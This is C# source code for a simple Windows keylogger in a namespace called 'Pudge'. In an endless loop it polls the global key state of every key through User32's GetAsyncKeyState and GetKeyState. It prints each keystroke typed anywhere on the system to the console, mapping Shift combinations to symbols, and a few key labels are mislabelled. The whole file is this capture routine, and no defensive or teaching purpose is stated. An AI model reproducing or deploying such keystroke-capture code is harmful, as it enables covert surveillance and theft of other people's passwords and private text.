 
using System;
using System.Runtime.InteropServices;

namespace Pudge
{
    class Program
    {
        [DllImport("User32.dll")]
        public static extern int GetKeyState(int i);

        [DllImport("User32.dll")]
        public static extern int GetAsyncKeyState(int i);

        static void Main(string[] args)
        {
            bool isShift = false;

            while (true)
            {
                for (int i = 8; i < 223; i++)
                {
                    if (GetAsyncKeyState(i) == 32769)
                    {
                        if (GetKeyState(16) == 65408 || GetKeyState(16) == 65409)
                        {
                            switch (i)
                            {
                                case 48:
                                    Console.WriteLine(") ");
                                    break;
                                case 49:
                                    Console.WriteLine("! ");
                                    break;
                                case 50:
                                    Console.WriteLine("@ ");
                                    break;
                                case 51:
                                    Console.WriteLine("# ");
                                    break;
                                case 52:
                                    Console.WriteLine("$ ");
                                    break;
                                case 53:
                                    Console.WriteLine("% ");
                                    break;
                                case 54:
                                    Console.WriteLine("^ ");
                                    break;
                                case 55:
                                    Console.WriteLine("& ");
                                    break;
                                case 56:
                                    Console.WriteLine("* ");
                                    break;
                                case 57:
                                    Console.WriteLine("( ");
                                    break;
                                case 160:
                                    if (!isShift)
                                    {
                                        Console.WriteLine("leftShift ");
                                        isShift = true;
                                    }
                                    break;
                                case 161:
                                    if (!isShift)
                                    {
                                        Console.WriteLine("rightShift ");
                                        isShift = true;
                                    }
                                    break;
                                case 186:
                                    Console.WriteLine(": ");
                                    break;
                                case 187:
                                    Console.WriteLine("+ ");
                                    break;
                                case 188:
                                    Console.WriteLine("< ");
                                    break;
                                case 189:
                                    Console.WriteLine("_ ");
                                    break;
                                case 190:
                                    Console.WriteLine("> ");
                                    break;
                                case 191:
                                    Console.WriteLine("? ");
                                    break;
                                case 192:
                                    Console.WriteLine("~ ");
                                    break;
                                case 219:
                                    Console.WriteLine("{ ");
                                    break;
                                case 220:
                                    Console.WriteLine("| ");
                                    break;
                                case 221:
                                    Console.WriteLine("} ");
                                    break;
                                case 222:
                                    Console.WriteLine('"' + " ");
                                    break;
                                default:
                                    if ((i >= 'A' && i <= 'Z') || (i >= 'a' && i <= 'z'))
                                    {
                                        if (Console.CapsLock)
                                        {
                                            Console.WriteLine(Convert.ToChar(i + 32) + " ");
                                        }
                                        else
                                        {
                                            Console.WriteLine(Convert.ToChar(i) + " ");
                                        }
                                    }
                                    break;
                            }
                        }
                        else
                        {
                            isShift = false;
                            switch (i)
                            {
                                case 8:
                                    Console.WriteLine("Backspace ");
                                    break;
                                case 9:
                                    Console.WriteLine("Tab ");
                                    break;
                                case 13:
                                    Console.WriteLine("Enter ");
                                    break;
                                case 20:
                                    Console.WriteLine("CapsLock ");
                                    break;
                                case 22:
                                    Console.WriteLine("' ");
                                    break;
                                case 27:
                                    Console.WriteLine("Escape ");
                                    break;
                                case 32:
                                    Console.WriteLine("Space ");
                                    break;
                                case 37:
                                    Console.WriteLine("pgLeft ");
                                    break;
                                case 38:
                                    Console.WriteLine("pgUp ");
                                    break;
                                case 39:
                                    Console.WriteLine("pgRight ");
                                    break;
                                case 40:
                                    Console.WriteLine("pgDown ");
                                    break;
                                case 91:
                                    Console.WriteLine("Win ");
                                    break;
                                case 162:
                                    Console.WriteLine("leftCtrl ");
                                    break;
                                case 163:
                                    Console.WriteLine("rightCtrl ");
                                    break;
                                case 164:
                                    Console.WriteLine("leftAlt ");
                                    break;
                                case 165:
                                    Console.WriteLine("rightAlt ");
                                    break;
                                case 186:
                                    Console.WriteLine("; ");
                                    break;
                                case 187:
                                    Console.WriteLine("= ");
                                    break;
                                case 188:
                                    Console.WriteLine(", ");
                                    break;
                                case 189:
                                    Console.WriteLine("- ");
                                    break;
                                case 190:
                                    Console.WriteLine(". ");
                                    break;
                                case 191:
                                    Console.WriteLine("/ ");
                                    break;
                                case 192:
                                    Console.WriteLine("` ");
                                    break;
                                case 219:
                                    Console.WriteLine("[ ");
                                    break;
                                case 220:
                                    Console.WriteLine(@"\ ");
                                    break;
                                case 221:
                                    Console.WriteLine("] ");
                                    break;
                                case 222:
                                    Console.WriteLine("' ");
                                    break;
                                default:
                                    if ((i >= 'A' && i <= 'Z') || (i >= 'a' && i <= 'z') || (i >= '0' && i <= '9'))
                                    {
                                        if (Console.CapsLock || (i >= '0' && i <= '9'))
                                        {
                                            Console.WriteLine(Convert.ToChar(i) + " ");
                                        }
                                        else
                                        {
                                            Console.WriteLine(Convert.ToChar(i + 32) + " ");
                                        }
                                    }
                                    break;
                            }
                        }
                    }
                }
            }
        }
    }
}